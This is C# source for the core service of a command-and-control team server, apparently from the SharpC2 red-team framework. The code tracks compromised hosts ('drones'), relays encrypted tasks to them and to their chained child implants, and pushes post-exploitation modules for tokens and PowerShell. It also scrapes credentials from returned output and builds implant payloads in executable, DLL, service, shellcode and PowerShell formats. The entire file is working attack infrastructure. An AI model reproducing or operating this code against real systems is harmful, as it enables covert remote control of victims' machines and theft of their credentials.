using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using AutoMapper;

using Microsoft.AspNetCore.SignalR;

using SharpC2.API.V1.Responses;

using TeamServer.Handlers;
using TeamServer.Hubs;
using TeamServer.Interfaces;
using TeamServer.Models;
using TeamServer.Modules;

namespace TeamServer.Services
{
    public class SharpC2Service : IServerService, IHandlerService, IDroneService, ITaskService, IPayloadService
    {
        private readonly ICryptoService _cryptoService;
        private readonly ICredentialService _credService;
        private readonly IMapper _mapper;
        private readonly IHubContext<MessageHub, IMessageHub> _hub;
        
        private readonly List<Handler> _handlers = new();
        private readonly List<Drone> _drones = new();
        private readonly List<Module> _modules = new();
        
        private C2Profile _profile;

        public SharpC2Service(ICryptoService cryptoService, IHubContext<MessageHub, IMessageHub> hub, IMapper mapper, ICredentialService credService)
        {
            _cryptoService = cryptoService;
            _credService = credService;
            
            _mapper = mapper;
            _hub = hub;
        }

        public void LoadDefaultModules()
        {
            var self = System.Reflection.Assembly.GetExecutingAssembly();

            foreach (var type in self.GetTypes())
            {
                if (!type.IsSubclassOf(typeof(Module))) continue;

                var module = Activator.CreateInstance(type) as Module;
                RegisterServerModule(module);
            }
        }

        private void RegisterServerModule(Module module)
        {
            module.Init(this, _hub);
            _modules.Add(module);
        }

        public void SetC2Profile(C2Profile profile)
        {
            _profile = profile;
        }

        public C2Profile GetC2Profile()
        {
            return _profile ?? new C2Profile();
        }

        public IEnumerable<Module> LoadModule(byte[] bytes)
        {
            List<Module> modules = new();
            
            var asm = System.Reflection.Assembly.Load(bytes);
            
            foreach (var type in asm.GetTypes())
            {
                if (!type.IsSubclassOf(typeof(Module))) continue;
                
                var module = Activator.CreateInstance(type) as Module;
                RegisterModule(module);
                modules.Add(module);
            }

            return modules;
        }

        private void RegisterModule(Module module)
        {
            module.Init(this, _hub);
            _modules.Add(module);
        }

        public Module GetModule(string name)
        {
            return GetModules().FirstOrDefault(m =>
                m.Name.Equals(name, StringComparison.OrdinalIgnoreCase));
        }

        public IEnumerable<Module> GetModules()
        {
            return _modules;
        }

        public async Task HandleC2Envelopes(IEnumerable<MessageEnvelope> envelopes)
        {
            foreach (var envelope in envelopes)
                await HandleC2Envelope(envelope);
        }
        
        private async Task HandleC2Envelope(MessageEnvelope envelope)
        {
            var message = _cryptoService.DecryptEnvelope(envelope);
            var drone = GetDrone(message.Metadata.Guid);

            if (drone is null)
            {
                drone = new Drone(message.Metadata);
                
                // new drone, send modules enabled in c2 profile
                await SendPostExModules(drone);
                AddDrone(drone);
            }
            
            drone.CheckIn();
            await _hub.Clients.All.DroneCheckedIn(drone.Metadata);

            switch (message.Type)
            {
                case C2Message.MessageType.DroneModule:
                    var module = message.Data.Deserialize<DroneModule>();
                    await HandleRegisterDroneModule(message.Metadata, module);
                    break;

                case C2Message.MessageType.DroneTaskUpdate:
                    var update = message.Data.Deserialize<DroneTaskUpdate>();
                    await HandleTaskUpdate(message.Metadata, update);
                    break;
                
                case C2Message.MessageType.NewLink:
                    var parentMetadata = message.Data.Deserialize<DroneMetadata>();
                    drone.Parent = parentMetadata.Guid;
                    break;
                
                default:
                    return;
            }
        }

        private async Task SendPostExModules(Drone drone)
        {
            var profile = GetC2Profile();
                
            if (profile.Stage.SendStandardModule)
            {
                drone.TaskDrone(new DroneTask("core", "load-module")
                {
                    Artefact = await Utilities.GetEmbeddedResource("std.dll")
                });
            }

            if (profile.Stage.SendTokenModule)
            {
                drone.TaskDrone(new DroneTask("core", "load-module")
                {
                    Artefact = await Utilities.GetEmbeddedResource("tokens.dll")
                });    
            }

            if (profile.Stage.SendPowerShellModule)
            {
                drone.TaskDrone(new DroneTask("core", "load-module")
                {
                    Artefact = await Utilities.GetEmbeddedResource("posh.dll")
                });  
            }
        }
        
        private async Task HandleRegisterDroneModule(DroneMetadata metadata, DroneModule module)
        {
            var drone = GetDrone(metadata.Guid);
            drone.AddModule(module);

            var response = _mapper.Map<DroneModule, DroneModuleResponse>(module);
            await _hub.Clients.All.DroneModuleLoaded(metadata, response);
        }
        
        private async Task HandleTaskUpdate(DroneMetadata metadata, DroneTaskUpdate update)
        {
            var module = _modules.FirstOrDefault(m =>
                m.Name.Equals(update.ServerModule, StringComparison.OrdinalIgnoreCase));

            if (module is null) return;
            await module.Execute(metadata, update);
            
            if (update.Result?.Length > 0)
                _credService.ScrapeCredentials(Encoding.UTF8.GetString(update.Result));
        }

        public void AddHandler(Handler handler)
        {
            _handlers.Add(handler);
        }

        public IEnumerable<Handler> LoadHandlers(byte[] bytes)
        {
            List<Handler> handlers = new();
            
            var asm = System.Reflection.Assembly.Load(bytes);
            
            foreach (var type in asm.GetTypes())
            {
                if (!type.IsSubclassOf(typeof(Handler))) continue;
                
                var handler = Activator.CreateInstance(type) as Handler;
                RegisterHandler(handler);
                handlers.Add(handler);
            }

            return handlers;
        }

        private void RegisterHandler(Handler handler)
        {
            handler.Init(this);
            _handlers.Add(handler);
        }

        public IEnumerable<Handler> GetHandlers()
        {
            return _handlers;
        }

        public Handler GetHandler(string name)
        {
            return GetHandlers()
                .FirstOrDefault(h => h.Name.Equals(name, StringComparison.OrdinalIgnoreCase));
        }

        public void RemoveHandler(Handler handler)
        {
            _handlers.Remove(handler);
        }

        public async Task<IEnumerable<MessageEnvelope>> GetDroneTasks(DroneMetadata metadata)
        {
            var drone = GetDrone(metadata.Guid);

            if (drone is null)
            {
                drone = new Drone(metadata);
                AddDrone(drone);
            }

            drone.CheckIn();
            await _hub.Clients.All.DroneCheckedIn(drone.Metadata);

            // create a new list of envelopes to send
            var envelopes = new List<MessageEnvelope>();

            // get a collection of all drones
            var allDrones = GetDrones().ToArray();
            
            // set the current "top-level" drones
            var currentParents = new[] { drone };
            
            while (true)
            {
                if (!currentParents.Any()) break;

                var allChildren = new List<Drone>();
                
                // iterate over each parent
                foreach (var parent in currentParents)
                {
                    var parentTasks = parent.GetPendingTasks().ToArray();
                    
                    if (parentTasks.Any())
                    {
                        var envelope = CreateEnvelopeFromTasks(parentTasks);
                        envelope.Drone = parent.Metadata.Guid;
                        envelopes.Add(envelope);
                    }

                    // get all drones that our current drones are parents for
                    var children = allDrones.Where(d => !string.IsNullOrWhiteSpace(d.Parent) && d.Parent.Equals(parent.Metadata.Guid)).ToArray();
                    if (children.Any()) allChildren.AddRange(children);
                }

                currentParents = allChildren.ToArray();
            }

            var messageSize = envelopes.Sum(e => e.Data.Length);
            
            if (messageSize > 0)
                await _hub.Clients.All.DroneDataSent(metadata, messageSize);

            return envelopes;
        }
        
        private MessageEnvelope CreateEnvelopeFromTasks(IEnumerable<DroneTask> tasks)
        {
            var message = new C2Message(C2Message.MessageDirection.Downstream, C2Message.MessageType.DroneTask)
            {
                Data = tasks.Serialize()
            };

            return _cryptoService.EncryptMessage(message);
        }

        public async Task<Payload> GeneratePayload(PayloadFormat format, Handler handler)
        {
            var key = _cryptoService.GetEncodedKey();

            Payload payload = format switch
            {
                PayloadFormat.Exe => new ExePayload(handler, GetC2Profile(), key),
                PayloadFormat.Dll => new DllPayload(handler, GetC2Profile(), key),
                PayloadFormat.Raw => new RawPayload(handler, GetC2Profile(), key),
                PayloadFormat.Svc => new ServicePayload(handler, GetC2Profile(), key),
                PayloadFormat.PowerShell => new PoshPayload(handler, GetC2Profile(), key),
                
                _ => throw new ArgumentOutOfRangeException()
            };

            await payload.Generate();
            return payload;
        }
        
        public enum PayloadFormat
        {
            Exe,
            Dll,
            Raw,
            Svc,
            PowerShell
        }

        public void AddDrone(Drone drone)
        {
            _drones.Add(drone);
        }

        public IEnumerable<Drone> GetDrones()
        {
            return _drones;
        }

        public Drone GetDrone(string guid)
        {
            return GetDrones()
                .FirstOrDefault(d => d.Metadata.Guid.Equals(guid));
        }

        public void RemoveDrone(Drone drone)
        {
            _drones.Remove(drone);
        }
    }
}